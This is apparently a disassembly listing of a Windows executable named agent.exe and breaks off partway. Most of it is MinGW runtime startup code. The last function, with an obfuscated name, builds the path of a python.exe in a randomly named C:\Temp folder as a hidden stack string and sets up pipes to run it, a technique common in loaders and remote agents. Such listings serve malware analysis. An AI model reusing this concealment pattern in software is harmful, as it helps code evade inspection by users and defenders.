
agent.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <__mingw_invalidParameterHandler>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140001010 <pre_c_init>:
   140001010:	48 83 ec 28          	sub    $0x28,%rsp
   140001014:	48 8b 05 e5 a9 00 00 	mov    0xa9e5(%rip),%rax        # 14000ba00 <.refptr.__mingw_initltsdrot_force>
   14000101b:	31 c9                	xor    %ecx,%ecx
   14000101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001023:	48 8b 05 e6 a9 00 00 	mov    0xa9e6(%rip),%rax        # 14000ba10 <.refptr.__mingw_initltsdyn_force>
   14000102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001030:	48 8b 05 e9 a9 00 00 	mov    0xa9e9(%rip),%rax        # 14000ba20 <.refptr.__mingw_initltssuo_force>
   140001037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000103d:	48 8b 05 2c a9 00 00 	mov    0xa92c(%rip),%rax        # 14000b970 <.refptr.__ImageBase>
   140001044:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001049:	75 0f                	jne    14000105a <pre_c_init+0x4a>
   14000104b:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000104f:	48 01 d0             	add    %rdx,%rax
   140001052:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001058:	74 66                	je     1400010c0 <pre_c_init+0xb0>
   14000105a:	48 8b 05 8f a9 00 00 	mov    0xa98f(%rip),%rax        # 14000b9f0 <.refptr.__mingw_app_type>
   140001061:	89 0d a5 df 00 00    	mov    %ecx,0xdfa5(%rip)        # 14000f00c <managedapp>
   140001067:	8b 00                	mov    (%rax),%eax
   140001069:	85 c0                	test   %eax,%eax
   14000106b:	74 43                	je     1400010b0 <pre_c_init+0xa0>
   14000106d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001072:	e8 d1 82 00 00       	call   140009348 <__set_app_type>
   140001077:	e8 34 7d 00 00       	call   140008db0 <__p__fmode>
   14000107c:	48 8b 15 4d aa 00 00 	mov    0xaa4d(%rip),%rdx        # 14000bad0 <.refptr._fmode>
   140001083:	8b 12                	mov    (%rdx),%edx
   140001085:	89 10                	mov    %edx,(%rax)
   140001087:	e8 34 7d 00 00       	call   140008dc0 <__p__commode>
   14000108c:	48 8b 15 1d aa 00 00 	mov    0xaa1d(%rip),%rdx        # 14000bab0 <.refptr._commode>
   140001093:	8b 12                	mov    (%rdx),%edx
   140001095:	89 10                	mov    %edx,(%rax)
   140001097:	e8 94 19 00 00       	call   140002a30 <_setargv>
   14000109c:	48 8b 05 ad a8 00 00 	mov    0xa8ad(%rip),%rax        # 14000b950 <.refptr._MINGW_INSTALL_DEBUG_MATHERR>
   1400010a3:	83 38 01             	cmpl   $0x1,(%rax)
   1400010a6:	74 50                	je     1400010f8 <pre_c_init+0xe8>
   1400010a8:	31 c0                	xor    %eax,%eax
   1400010aa:	48 83 c4 28          	add    $0x28,%rsp
   1400010ae:	c3                   	ret
   1400010af:	90                   	nop
   1400010b0:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010b5:	e8 8e 82 00 00       	call   140009348 <__set_app_type>
   1400010ba:	eb bb                	jmp    140001077 <pre_c_init+0x67>
   1400010bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010c0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010c4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010c9:	74 45                	je     140001110 <pre_c_init+0x100>
   1400010cb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010d0:	75 88                	jne    14000105a <pre_c_init+0x4a>
   1400010d2:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010d9:	0f 86 7b ff ff ff    	jbe    14000105a <pre_c_init+0x4a>
   1400010df:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010e5:	31 c9                	xor    %ecx,%ecx
   1400010e7:	85 d2                	test   %edx,%edx
   1400010e9:	0f 95 c1             	setne  %cl
   1400010ec:	e9 69 ff ff ff       	jmp    14000105a <pre_c_init+0x4a>
   1400010f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400010f8:	48 8b 0d f1 a9 00 00 	mov    0xa9f1(%rip),%rcx        # 14000baf0 <.refptr._matherr>
   1400010ff:	e8 ac 20 00 00       	call   1400031b0 <__mingw_setusermatherr>
   140001104:	31 c0                	xor    %eax,%eax
   140001106:	48 83 c4 28          	add    $0x28,%rsp
   14000110a:	c3                   	ret
   14000110b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001110:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   140001114:	0f 86 40 ff ff ff    	jbe    14000105a <pre_c_init+0x4a>
   14000111a:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001121:	31 c9                	xor    %ecx,%ecx
   140001123:	45 85 c0             	test   %r8d,%r8d
   140001126:	0f 95 c1             	setne  %cl
   140001129:	e9 2c ff ff ff       	jmp    14000105a <pre_c_init+0x4a>
   14000112e:	66 90                	xchg   %ax,%ax

0000000140001130 <pre_cpp_init>:
   140001130:	48 83 ec 38          	sub    $0x38,%rsp
   140001134:	48 8b 05 c5 a9 00 00 	mov    0xa9c5(%rip),%rax        # 14000bb00 <.refptr._newmode>
   14000113b:	4c 8d 05 d6 de 00 00 	lea    0xded6(%rip),%r8        # 14000f018 <envp>
   140001142:	48 8d 15 d7 de 00 00 	lea    0xded7(%rip),%rdx        # 14000f020 <argv>
   140001149:	48 8d 0d d8 de 00 00 	lea    0xded8(%rip),%rcx        # 14000f028 <argc>
   140001150:	8b 00                	mov    (%rax),%eax
   140001152:	89 05 ac de 00 00    	mov    %eax,0xdeac(%rip)        # 14000f004 <startinfo>
   140001158:	48 8b 05 61 a9 00 00 	mov    0xa961(%rip),%rax        # 14000bac0 <.refptr._dowildcard>
   14000115f:	44 8b 08             	mov    (%rax),%r9d
   140001162:	48 8d 05 9b de 00 00 	lea    0xde9b(%rip),%rax        # 14000f004 <startinfo>
   140001169:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000116e:	e8 c5 81 00 00       	call   140009338 <__getmainargs>
   140001173:	90                   	nop
   140001174:	48 83 c4 38          	add    $0x38,%rsp
   140001178:	c3                   	ret
   140001179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140001180 <__tmainCRTStartup>:
   140001180:	41 54                	push   %r12
   140001182:	55                   	push   %rbp
   140001183:	57                   	push   %rdi
   140001184:	56                   	push   %rsi
   140001185:	53                   	push   %rbx
   140001186:	48 83 ec 20          	sub    $0x20,%rsp
   14000118a:	48 8b 1d af a8 00 00 	mov    0xa8af(%rip),%rbx        # 14000ba40 <.refptr.__native_startup_lock>
   140001191:	48 8b 3d c0 f1 00 00 	mov    0xf1c0(%rip),%rdi        # 140010358 <__imp_Sleep>
   140001198:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   14000119f:	00 00 
   1400011a1:	48 8b 70 08          	mov    0x8(%rax),%rsi
   1400011a5:	eb 19                	jmp    1400011c0 <__tmainCRTStartup+0x40>
   1400011a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400011ae:	00 00 
   1400011b0:	48 39 c6             	cmp    %rax,%rsi
   1400011b3:	0f 84 67 01 00 00    	je     140001320 <__tmainCRTStartup+0x1a0>
   1400011b9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011be:	ff d7                	call   *%rdi
   1400011c0:	31 c0                	xor    %eax,%eax
   1400011c2:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   1400011c7:	75 e7                	jne    1400011b0 <__tmainCRTStartup+0x30>
   1400011c9:	48 8b 35 80 a8 00 00 	mov    0xa880(%rip),%rsi        # 14000ba50 <.refptr.__native_startup_state>
   1400011d0:	31 ff                	xor    %edi,%edi
   1400011d2:	8b 06                	mov    (%rsi),%eax
   1400011d4:	83 f8 01             	cmp    $0x1,%eax
   1400011d7:	0f 84 5a 01 00 00    	je     140001337 <__tmainCRTStartup+0x1b7>
   1400011dd:	8b 06                	mov    (%rsi),%eax
   1400011df:	85 c0                	test   %eax,%eax
   1400011e1:	0f 84 b9 01 00 00    	je     1400013a0 <__tmainCRTStartup+0x220>
   1400011e7:	c7 05 17 de 00 00 01 	movl   $0x1,0xde17(%rip)        # 14000f008 <has_cctor>
   1400011ee:	00 00 00 
   1400011f1:	8b 06                	mov    (%rsi),%eax
   1400011f3:	83 f8 01             	cmp    $0x1,%eax
   1400011f6:	0f 84 50 01 00 00    	je     14000134c <__tmainCRTStartup+0x1cc>
   1400011fc:	85 ff                	test   %edi,%edi
   1400011fe:	0f 84 69 01 00 00    	je     14000136d <__tmainCRTStartup+0x1ed>
   140001204:	48 8b 05 95 a7 00 00 	mov    0xa795(%rip),%rax        # 14000b9a0 <.refptr.__dyn_tls_init_callback>
   14000120b:	48 8b 00             	mov    (%rax),%rax
   14000120e:	48 85 c0             	test   %rax,%rax
   140001211:	74 0c                	je     14000121f <__tmainCRTStartup+0x9f>
   140001213:	45 31 c0             	xor    %r8d,%r8d
   140001216:	ba 02 00 00 00       	mov    $0x2,%edx
   14000121b:	31 c9                	xor    %ecx,%ecx
   14000121d:	ff d0                	call   *%rax
   14000121f:	e8 dc 1b 00 00       	call   140002e00 <_pei386_runtime_relocator>
   140001224:	48 8b 0d b5 a8 00 00 	mov    0xa8b5(%rip),%rcx        # 14000bae0 <.refptr._gnu_exception_handler>
   14000122b:	ff 15 1f f1 00 00    	call   *0xf11f(%rip)        # 140010350 <__imp_SetUnhandledExceptionFilter>
   140001231:	48 8b 15 f8 a7 00 00 	mov    0xa7f8(%rip),%rdx        # 14000ba30 <.refptr.__mingw_oldexcpt_handler>
   140001238:	48 8d 0d c1 fd ff ff 	lea    -0x23f(%rip),%rcx        # 140001000 <__mingw_invalidParameterHandler>
   14000123f:	48 89 02             	mov    %rax,(%rdx)
   140001242:	e8 a9 7b 00 00       	call   140008df0 <_set_invalid_parameter_handler>
   140001247:	e8 c4 19 00 00       	call   140002c10 <_fpreset>
   14000124c:	8b 1d d6 dd 00 00    	mov    0xddd6(%rip),%ebx        # 14000f028 <argc>
   140001252:	8d 7b 01             	lea    0x1(%rbx),%edi
   140001255:	48 63 ff             	movslq %edi,%rdi
   140001258:	48 c1 e7 03          	shl    $0x3,%rdi
   14000125c:	48 89 f9             	mov    %rdi,%rcx
   14000125f:	e8 6c 81 00 00       	call   1400093d0 <malloc>
   140001264:	4c 8b 25 b5 dd 00 00 	mov    0xddb5(%rip),%r12        # 14000f020 <argv>
   14000126b:	48 89 c5             	mov    %rax,%rbp
   14000126e:	85 db                	test   %ebx,%ebx
   140001270:	0f 8e 4a 01 00 00    	jle    1400013c0 <__tmainCRTStartup+0x240>
   140001276:	48 83 ef 08          	sub    $0x8,%rdi
   14000127a:	31 db                	xor    %ebx,%ebx
   14000127c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001280:	49 8b 0c 1c          	mov    (%r12,%rbx,1),%rcx
   140001284:	e8 77 81 00 00       	call   140009400 <strlen>
   140001289:	48 8d 70 01          	lea    0x1(%rax),%rsi
   14000128d:	48 89 f1             	mov    %rsi,%rcx
   140001290:	e8 3b 81 00 00       	call   1400093d0 <malloc>
   140001295:	49 89 f0             	mov    %rsi,%r8
   140001298:	48 89 44 1d 00       	mov    %rax,0x0(%rbp,%rbx,1)
   14000129d:	49 8b 14 1c          	mov    (%r12,%rbx,1),%rdx
   1400012a1:	48 89 c1             	mov    %rax,%rcx
   1400012a4:	48 83 c3 08          	add    $0x8,%rbx
   1400012a8:	e8 2b 81 00 00       	call   1400093d8 <memcpy>
   1400012ad:	48 39 df             	cmp    %rbx,%rdi
   1400012b0:	75 ce                	jne    140001280 <__tmainCRTStartup+0x100>
   1400012b2:	48 01 ef             	add    %rbp,%rdi
   1400012b5:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   1400012bc:	48 89 2d 5d dd 00 00 	mov    %rbp,0xdd5d(%rip)        # 14000f020 <argv>
   1400012c3:	e8 48 17 00 00       	call   140002a10 <__main>
   1400012c8:	48 8b 05 e1 a6 00 00 	mov    0xa6e1(%rip),%rax        # 14000b9b0 <.refptr.__imp___initenv>
   1400012cf:	4c 8b 05 42 dd 00 00 	mov    0xdd42(%rip),%r8        # 14000f018 <envp>
   1400012d6:	8b 0d 4c dd 00 00    	mov    0xdd4c(%rip),%ecx        # 14000f028 <argc>
   1400012dc:	48 8b 00             	mov    (%rax),%rax
   1400012df:	4c 89 00             	mov    %r8,(%rax)
   1400012e2:	48 8b 15 37 dd 00 00 	mov    0xdd37(%rip),%rdx        # 14000f020 <argv>
   1400012e9:	e8 e2 81 00 00       	call   1400094d0 <main>
   1400012ee:	8b 0d 18 dd 00 00    	mov    0xdd18(%rip),%ecx        # 14000f00c <managedapp>
   1400012f4:	89 05 16 dd 00 00    	mov    %eax,0xdd16(%rip)        # 14000f010 <mainret>
   1400012fa:	85 c9                	test   %ecx,%ecx
   1400012fc:	0f 84 c6 00 00 00    	je     1400013c8 <__tmainCRTStartup+0x248>
   140001302:	8b 15 00 dd 00 00    	mov    0xdd00(%rip),%edx        # 14000f008 <has_cctor>
   140001308:	85 d2                	test   %edx,%edx
   14000130a:	74 74                	je     140001380 <__tmainCRTStartup+0x200>
   14000130c:	48 83 c4 20          	add    $0x20,%rsp
   140001310:	5b                   	pop    %rbx
   140001311:	5e                   	pop    %rsi
   140001312:	5f                   	pop    %rdi
   140001313:	5d                   	pop    %rbp
   140001314:	41 5c                	pop    %r12
   140001316:	c3                   	ret
   140001317:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000131e:	00 00 
   140001320:	48 8b 35 29 a7 00 00 	mov    0xa729(%rip),%rsi        # 14000ba50 <.refptr.__native_startup_state>
   140001327:	bf 01 00 00 00       	mov    $0x1,%edi
   14000132c:	8b 06                	mov    (%rsi),%eax
   14000132e:	83 f8 01             	cmp    $0x1,%eax
   140001331:	0f 85 a6 fe ff ff    	jne    1400011dd <__tmainCRTStartup+0x5d>
   140001337:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000133c:	e8 17 80 00 00       	call   140009358 <_amsg_exit>
   140001341:	8b 06                	mov    (%rsi),%eax
   140001343:	83 f8 01             	cmp    $0x1,%eax
   140001346:	0f 85 b0 fe ff ff    	jne    1400011fc <__tmainCRTStartup+0x7c>
   14000134c:	48 8b 15 2d a7 00 00 	mov    0xa72d(%rip),%rdx        # 14000ba80 <.refptr.__xc_z>
   140001353:	48 8b 0d 16 a7 00 00 	mov    0xa716(%rip),%rcx        # 14000ba70 <.refptr.__xc_a>
   14000135a:	e8 19 80 00 00       	call   140009378 <_initterm>
   14000135f:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
   140001365:	85 ff                	test   %edi,%edi
   140001367:	0f 85 97 fe ff ff    	jne    140001204 <__tmainCRTStartup+0x84>
   14000136d:	31 c0                	xor    %eax,%eax
   14000136f:	48 87 03             	xchg   %rax,(%rbx)
   140001372:	e9 8d fe ff ff       	jmp    140001204 <__tmainCRTStartup+0x84>
   140001377:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000137e:	00 00 
   140001380:	e8 db 7f 00 00       	call   140009360 <_cexit>
   140001385:	8b 05 85 dc 00 00    	mov    0xdc85(%rip),%eax        # 14000f010 <mainret>
   14000138b:	48 83 c4 20          	add    $0x20,%rsp
   14000138f:	5b                   	pop    %rbx
   140001390:	5e                   	pop    %rsi
   140001391:	5f                   	pop    %rdi
   140001392:	5d                   	pop    %rbp
   140001393:	41 5c                	pop    %r12
   140001395:	c3                   	ret
   140001396:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000139d:	00 00 00 
   1400013a0:	48 8b 15 f9 a6 00 00 	mov    0xa6f9(%rip),%rdx        # 14000baa0 <.refptr.__xi_z>
   1400013a7:	48 8b 0d e2 a6 00 00 	mov    0xa6e2(%rip),%rcx        # 14000ba90 <.refptr.__xi_a>
   1400013ae:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   1400013b4:	e8 bf 7f 00 00       	call   140009378 <_initterm>
   1400013b9:	e9 33 fe ff ff       	jmp    1400011f1 <__tmainCRTStartup+0x71>
   1400013be:	66 90                	xchg   %ax,%ax
   1400013c0:	48 89 c7             	mov    %rax,%rdi
   1400013c3:	e9 ed fe ff ff       	jmp    1400012b5 <__tmainCRTStartup+0x135>
   1400013c8:	89 c1                	mov    %eax,%ecx
   1400013ca:	e8 d1 7f 00 00       	call   1400093a0 <exit>
   1400013cf:	90                   	nop

00000001400013d0 <WinMainCRTStartup>:
   1400013d0:	48 83 ec 28          	sub    $0x28,%rsp

00000001400013d4 <.l_startw>:
   1400013d4:	48 8b 05 15 a6 00 00 	mov    0xa615(%rip),%rax        # 14000b9f0 <.refptr.__mingw_app_type>
   1400013db:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013e1:	e8 9a fd ff ff       	call   140001180 <__tmainCRTStartup>
   1400013e6:	90                   	nop

00000001400013e7 <.l_endw>:
   1400013e7:	90                   	nop
   1400013e8:	48 83 c4 28          	add    $0x28,%rsp
   1400013ec:	c3                   	ret
   1400013ed:	0f 1f 00             	nopl   (%rax)

00000001400013f0 <mainCRTStartup>:
   1400013f0:	48 83 ec 28          	sub    $0x28,%rsp

00000001400013f4 <.l_start>:
   1400013f4:	48 8b 05 f5 a5 00 00 	mov    0xa5f5(%rip),%rax        # 14000b9f0 <.refptr.__mingw_app_type>
   1400013fb:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001401:	e8 7a fd ff ff       	call   140001180 <__tmainCRTStartup>
   140001406:	90                   	nop

0000000140001407 <.l_end>:
   140001407:	90                   	nop
   140001408:	48 83 c4 28          	add    $0x28,%rsp
   14000140c:	c3                   	ret
   14000140d:	0f 1f 00             	nopl   (%rax)

0000000140001410 <atexit>:
   140001410:	48 83 ec 28          	sub    $0x28,%rsp
   140001414:	e8 6f 7f 00 00       	call   140009388 <_onexit>
   140001419:	48 83 f8 01          	cmp    $0x1,%rax
   14000141d:	19 c0                	sbb    %eax,%eax
   14000141f:	48 83 c4 28          	add    $0x28,%rsp
   140001423:	c3                   	ret
   140001424:	90                   	nop
   140001425:	90                   	nop
   140001426:	90                   	nop
   140001427:	90                   	nop
   140001428:	90                   	nop
   140001429:	90                   	nop
   14000142a:	90                   	nop
   14000142b:	90                   	nop
   14000142c:	90                   	nop
   14000142d:	90                   	nop
   14000142e:	90                   	nop
   14000142f:	90                   	nop

0000000140001430 <__gcc_register_frame>:
   140001430:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 140001440 <__gcc_deregister_frame>
   140001437:	e9 d4 ff ff ff       	jmp    140001410 <atexit>
   14000143c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140001440 <__gcc_deregister_frame>:
   140001440:	c3                   	ret
   140001441:	90                   	nop
   140001442:	90                   	nop
   140001443:	90                   	nop
   140001444:	90                   	nop
   140001445:	90                   	nop
   140001446:	90                   	nop
   140001447:	90                   	nop
   140001448:	90                   	nop
   140001449:	90                   	nop
   14000144a:	90                   	nop
   14000144b:	90                   	nop
   14000144c:	90                   	nop
   14000144d:	90                   	nop
   14000144e:	90                   	nop
   14000144f:	90                   	nop

0000000140001450 <snprintf>:
   140001450:	48 83 ec 38          	sub    $0x38,%rsp
   140001454:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140001459:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000145e:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   140001463:	e8 c8 25 00 00       	call   140003a30 <__mingw_vsnprintf>
   140001468:	48 83 c4 38          	add    $0x38,%rsp
   14000146c:	c3                   	ret
   14000146d:	0f 1f 00             	nopl   (%rax)

0000000140001470 <sprintf.constprop.0>:
   140001470:	48 83 ec 38          	sub    $0x38,%rsp
   140001474:	48 8d 15 85 9b 00 00 	lea    0x9b85(%rip),%rdx        # 14000b000 <.rdata>
   14000147b:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140001480:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001485:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   14000148a:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   14000148f:	e8 fc 25 00 00       	call   140003a90 <__mingw_vsprintf>
   140001494:	48 83 c4 38          	add    $0x38,%rsp
   140001498:	c3                   	ret
   140001499:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000001400014a0 <g5_2_2lthb4>:
   1400014a0:	41 57                	push   %r15
   1400014a2:	b8 48 14 00 00       	mov    $0x1448,%eax
   1400014a7:	41 56                	push   %r14
   1400014a9:	41 55                	push   %r13
   1400014ab:	41 54                	push   %r12
   1400014ad:	55                   	push   %rbp
   1400014ae:	57                   	push   %rdi
   1400014af:	56                   	push   %rsi
   1400014b0:	53                   	push   %rbx
   1400014b1:	e8 3a 25 00 00       	call   1400039f0 <___chkstk_ms>
   1400014b6:	48 29 c4             	sub    %rax,%rsp
   1400014b9:	48 be 74 68 62 34 5c 	movabs $0x7479705c34626874,%rsi
   1400014c0:	70 79 74 
   1400014c3:	48 89 cd             	mov    %rcx,%rbp
   1400014c6:	48 89 d3             	mov    %rdx,%rbx
   1400014c9:	48 b9 43 3a 5c 54 65 	movabs $0x5c706d65545c3a43,%rcx
   1400014d0:	6d 70 5c 
   1400014d3:	48 ba 30 35 66 74 38 	movabs $0x6c325f3874663530,%rdx
   1400014da:	5f 32 6c 
   1400014dd:	48 89 8c 24 40 01 00 	mov    %rcx,0x140(%rsp)
   1400014e4:	00 
   1400014e5:	4c 89 c7             	mov    %r8,%rdi
   1400014e8:	48 89 e9             	mov    %rbp,%rcx
   1400014eb:	49 b8 68 6f 6e 2e 65 	movabs $0x6578652e6e6f68,%r8
   1400014f2:	78 65 00 
   1400014f5:	48 89 94 24 48 01 00 	mov    %rdx,0x148(%rsp)
   1400014fc:	00 
   1400014fd:	4c 89 84 24 58 01 00 	mov    %r8,0x158(%rsp)
   140001504:	00 
   140001505:	48 89 b4 24 50 01 00 	mov    %rsi,0x150(%rsp)
   14000150c:	00 
   14000150d:	48 c7 84 24 60 01 00 	movq   $0x0,0x160(%rsp)
   140001514:	00 00 00 00 00 
   140001519:	48 c7 84 24 68 01 00 	movq   $0x0,0x168(%rsp)
   140001520:	00 00 00 00 00 
   140001525:	48 c7 84 24 70 01 00 	movq   $0x0,0x170(%rsp)
   14000152c:	00 00 00 00 00 
   140001531:	48 c7 84 24 78 01 00 	movq   $0x0,0x178(%rsp)
   140001538:	00 00 00 00 00 
   14000153d:	48 c7 84 24 80 01 00 	movq   $0x0,0x180(%rsp)
   140001544:	00 00 00 00 00 
   140001549:	48 c7 84 24 88 01 00 	movq   $0x0,0x188(%rsp)
   140001550:	00 00 00 00 00 
   140001555:	48 c7 84 24 90 01 00 	movq   $0x0,0x190(%rsp)
   14000155c:	00 00 00 00 00 
   140001561:	48 c7 84 24 98 01 00 	movq   $0x0,0x198(%rsp)
   140001568:	00 00 00 00 00 
   14000156d:	48 c7 84 24 a0 01 00 	movq   $0x0,0x1a0(%rsp)
   140001574:	00 00 00 00 00 
   140001579:	48 c7 84 24 a8 01 00 	movq   $0x0,0x1a8(%rsp)
   140001580:	00 00 00 00 00 
   140001585:	48 c7 84 24 b0 01 00 	movq   $0x0,0x1b0(%rsp)
   14000158c:	00 00 00 00 00 
   140001591:	48 c7 84 24 b8 01 00 	movq   $0x0,0x1b8(%rsp)
   140001598:	00 00 00 00 00 
   14000159d:	48 c7 84 24 c0 01 00 	movq   $0x0,0x1c0(%rsp)
   1400015a4:	00 00 00 00 00 
   1400015a9:	48 c7 84 24 c8 01 00 	movq   $0x0,0x1c8(%rsp)
   1400015b0:	00 00 00 00 00 
   1400015b5:	48 c7 84 24 d0 01 00 	movq   $0x0,0x1d0(%rsp)
   1400015bc:	00 00 00 00 00 
   1400015c1:	48 c7 84 24 d8 01 00 	movq   $0x0,0x1d8(%rsp)
   1400015c8:	00 00 00 00 00 
   1400015cd:	48 c7 84 24 e0 01 00 	movq   $0x0,0x1e0(%rsp)
   1400015d4:	00 00 00 00 00 
   1400015d9:	48 c7 84 24 e8 01 00 	movq   $0x0,0x1e8(%rsp)
   1400015e0:	00 00 00 00 00 
   1400015e5:	48 c7 84 24 f0 01 00 	movq   $0x0,0x1f0(%rsp)
   1400015ec:	00 00 00 00 00 
   1400015f1:	48 c7 84 24 f8 01 00 	movq   $0x0,0x1f8(%rsp)
   1400015f8:	00 00 00 00 00 
   1400015fd:	48 c7 84 24 00 02 00 	movq   $0x0,0x200(%rsp)
   140001604:	00 00 00 00 00 
   140001609:	48 c7 84 24 08 02 00 	movq   $0x0,0x208(%rsp)
   140001610:	00 00 00 00 00 
   140001615:	48 c7 84 24 10 02 00 	movq   $0x0,0x210(%rsp)
   14000161c:	00 00 00 00 00 
   140001621:	48 c7 84 24 18 02 00 	movq   $0x0,0x218(%rsp)
   140001628:	00 00 00 00 00 
   14000162d:	48 c7 84 24 20 02 00 	movq   $0x0,0x220(%rsp)
   140001634:	00 00 00 00 00 
   140001639:	48 c7 84 24 28 02 00 	movq   $0x0,0x228(%rsp)
   140001640:	00 00 00 00 00 
   140001645:	48 c7 84 24 30 02 00 	movq   $0x0,0x230(%rsp)
   14000164c:	00 00 00 00 00 
   140001651:	48 c7 84 24 38 02 00 	movq   $0x0,0x238(%rsp)
   140001658:	00 00 00 00 00 
   14000165d:	e8 9e 7d 00 00       	call   140009400 <strlen>
   140001662:	48 8d 88 19 01 00 00 	lea    0x119(%rax),%rcx
   140001669:	e8 62 7d 00 00       	call   1400093d0 <malloc>
   14000166e:	49 89 c5             	mov    %rax,%r13
   140001671:	48 85 c0             	test   %rax,%rax
   140001674:	0f 84 c2 03 00 00    	je     140001a3c <g5_2_2lthb4+0x59c>
   14000167a:	49 89 e8             	mov    %rbp,%r8
   14000167d:	48 8d 15 7c 99 00 00 	lea    0x997c(%rip),%rdx        # 14000b000 <.rdata>
   140001684:	48 89 c1             	mov    %rax,%rcx
   140001687:	e8 e4 fd ff ff       	call   140001470 <sprintf.constprop.0>
   14000168c:	4c 8d a4 24 90 00 00 	lea    0x90(%rsp),%r12
   140001693:	00 
   140001694:	45 31 c9             	xor    %r9d,%r9d
   140001697:	c7 84 24 90 00 00 00 	movl   $0x18,0x90(%rsp)
   14000169e:	18 00 00 00 
   1400016a2:	4c 8b 35 3f ec 00 00 	mov    0xec3f(%rip),%r14        # 1400102e8 <__imp_CreatePipe>
   1400016a9:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   1400016ae:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400016b3:	4d 89 e0             	mov    %r12,%r8
   1400016b6:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400016bd:	00 00 00 00 00 
   1400016c2:	c7 84 24 a0 00 00 00 	movl   $0x1,0xa0(%rsp)
   1400016c9:	01 00 00 00 
   1400016cd:	41 ff d6             	call   *%r14
   1400016d0:	85 c0                	test   %eax,%eax
   1400016d2:	0f 84 5c 03 00 00    	je     140001a34 <g5_2_2lthb4+0x594>
   1400016d8:	45 31 c9             	xor    %r9d,%r9d
   1400016db:	48 8d 94 24 88 00 00 	lea    0x88(%rsp),%rdx
   1400016e2:	00 
   1400016e3:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400016ea:	00 
   1400016eb:	4d 89 e0             	mov    %r12,%r8
   1400016ee:	41 ff d6             	call   *%r14
   1400016f1:	85 c0                	test   %eax,%eax
   1400016f3:	0f 84 3b 03 00 00    	je     140001a34 <g5_2_2lthb4+0x594>
   1400016f9:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400016fe:	4c 8b 3d 43 ec 00 00 	mov    0xec43(%rip),%r15        # 140010348 <__imp_SetHandleInformation>
   140001705:	45 31 c0             	xor    %r8d,%r8d
   140001708:	ba 01 00 00 00       	mov    $0x1,%edx
   14000170d:	41 ff d7             	call   *%r15
   140001710:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140001717:	00 
   140001718:	45 31 c0             	xor    %r8d,%r8d
   14000171b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001720:	41 ff d7             	call   *%r15
   140001723:	4c 8b 8c 24 88 00 00 	mov    0x88(%rsp),%r9
   14000172a:	00 
   14000172b:	66 0f ef c0          	pxor   %xmm0,%xmm0
   14000172f:	ba 00 02 00 00       	mov    $0x200,%edx
   140001734:	f3 0f 7e 4c 24 70    	movq   0x70(%rsp),%xmm1
   14000173a:	48 8d ac 24 40 02 00 	lea    0x240(%rsp),%rbp
   140001741:	00 
   140001742:	4c 8d 05 d7 99 00 00 	lea    0x99d7(%rip),%r8        # 14000b120 <.rdata+0x120>
   140001749:	0f 11 84 24 04 01 00 	movups %xmm0,0x104(%rsp)
   140001750:	00 
   140001751:	4c 89 8c 24 30 01 00 	mov    %r9,0x130(%rsp)
   140001758:	00 
   140001759:	48 89 e9             	mov    %rbp,%rcx
   14000175c:	4c 8d 8c 24 40 01 00 	lea    0x140(%rsp),%r9
   140001763:	00 
   140001764:	0f 16 8c 24 88 00 00 	movhps 0x88(%rsp),%xmm1
   14000176b:	00 
